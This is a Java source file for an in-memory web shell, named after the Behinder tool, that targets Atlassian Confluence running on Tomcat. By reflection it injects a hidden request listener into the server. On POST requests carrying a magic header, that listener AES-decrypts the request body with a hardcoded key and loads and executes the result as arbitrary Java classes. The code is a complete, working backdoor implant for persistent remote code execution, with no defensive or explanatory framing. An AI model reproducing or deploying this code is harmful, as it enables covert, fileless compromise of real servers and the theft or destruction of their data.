import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class BehinderMemShell extends ClassLoader implements InvocationHandler {
    private static boolean initialized = false;
    private static Object lock = new Object();

    public BehinderMemShell(ClassLoader loader) {
        super(loader);
    }

    public BehinderMemShell() throws Exception {
        // 先拿到 classLoader ，保证这个 classLoader 可以加载 tomcat 的类
        ClassLoader classLoader = null;
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                // 需要获取线程的特征包含 hz.confluence.scheduled.thread
                if (thread.getName().contains("hz.confluence.scheduled.thread")) {
                    classLoader = thread.getContextClassLoader();
                }
            }catch (Exception e){}
        }

        synchronized (lock) {
            if (!initialized) {
                try {
                    Class servletRequestListenerClass = null;
                    try {
//                        servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
                        servletRequestListenerClass = classLoader.loadClass("jakarta.servlet.ServletRequestListener");
                    } catch (Exception var7) {
                        try {
//                            servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
                            servletRequestListenerClass = classLoader.loadClass("javax.servlet.ServletRequestListener");

                        } catch (ClassNotFoundException var6) {
                        }
                    }

                    if (servletRequestListenerClass != null) {
                        this.addListener(Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{servletRequestListenerClass}, this), this.getStandardContext());
                    }
                } catch (Throwable var8) {
                }

                initialized = true;
            }

        }
    }

    public static Object getStandardContext() throws Exception {
        // 获取当前线程的所有线程
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                // 需要获取线程的特征包含 hz.confluence.scheduled.thread
                if (thread.getName().contains("hz.confluence.scheduled.thread")) {
//                    threads[x].contextClassLoader.confluenceMonitoring.registry.applicationContext.servletContext.context.context
//                    Runtime.getRuntime().exec("touch /tmp/success-" + thread.getName());
                    Object standardContext;
//                    Runtime.getRuntime().exec("touch /tmp/success-o0");
                    standardContext = getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "contextClassLoader"),"confluenceMonitoring"),"registry"),"applicationContext"),"servletContext"),"context"),"context");
//                    Runtime.getRuntime().exec("touch /tmp/success-o1" + standardContext.getClass().getName());
                    return standardContext;
                }
            } catch (Exception e) {
                FileWriter writer = new FileWriter("touch /tmp/success-error-2");
                PrintWriter printWriter = new PrintWriter(writer);
                e.printStackTrace(printWriter);
                printWriter.close();
                writer.close();
            }
        }
//         没有获取到对应
        Object standardContext = null;
        return standardContext;
    }

//    Proxy.newProxyInstance 方法创建并返回一个代理对象，该对象实现了指定的接口，这里获取的是 实现 ServletRequestListener 的对象
    private void addListener(Object listener, Object standardContext) throws Exception {
        Method addApplicationEventListenerMethod = standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class);
        addApplicationEventListenerMethod.setAccessible(true);
        addApplicationEventListenerMethod.invoke(standardContext, listener);
//        return "ok";
    }

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("requestInitialized")) {
            Object servletRequestEvent = args[0];
            this.backDoor(servletRequestEvent);
        }
        return null;
    }

    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, ((Class[]) classes.toArray(new Class[0])));

            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }


    public String getParameter(Object requestObject, String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }

    public String getContentType(Object requestObject) {
        return (String) invokeMethod(requestObject, "getContentType");
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }


    private void backDoor(Object servletRequestEvent) {
        try {
            Object request = this.invokeMethod(servletRequestEvent, "getServletRequest");
            Object responseforvalidate = getFieldValue(getFieldValue(request, "request"), "response");

            if (this.invokeMethod(request, "getMethod").equals("POST")) {
//                X-Expires:memok
                if (this.invokeMethod(request,"getHeader","X-Expires").equals("memok")){
                    // User-Agent: C1xbiimb
                    // X-Expires: memok memerror
                    this.invokeMethod(responseforvalidate, "setHeader", "User-Agent", "C1xbiimb");
                    this.invokeMethod(responseforvalidate, "setHeader", "X-Expires", "memok memerror");

                    // String k = password;
                    // rebeyond
                    String k = "e45e329feb5d925b";
                    HttpSession session = (HttpSession) this.invokeMethod(request, "getSession");
                    session.setAttribute("u", k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                    byte[] bytesDecrypted = c.doFinal(Base64.getDecoder().decode(((BufferedReader) ((BufferedReader) this.invokeMethod(request, "getReader"))).readLine()));
                    Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                    method.setAccessible(true);
                    Class newClass = (Class) method.invoke(this.getClass().getClassLoader(), bytesDecrypted, 0, bytesDecrypted.length);
                    Object response = getFieldValue(getFieldValue(request, "request"), "response");
                    Map<String, Object> pageContext = new HashMap();
                    pageContext.put("session", session);
                    pageContext.put("request", request);
                    pageContext.put("response", response);
                    newClass.newInstance().equals(pageContext);
                }

            }
        } catch (Exception var11) {
        }

    }
}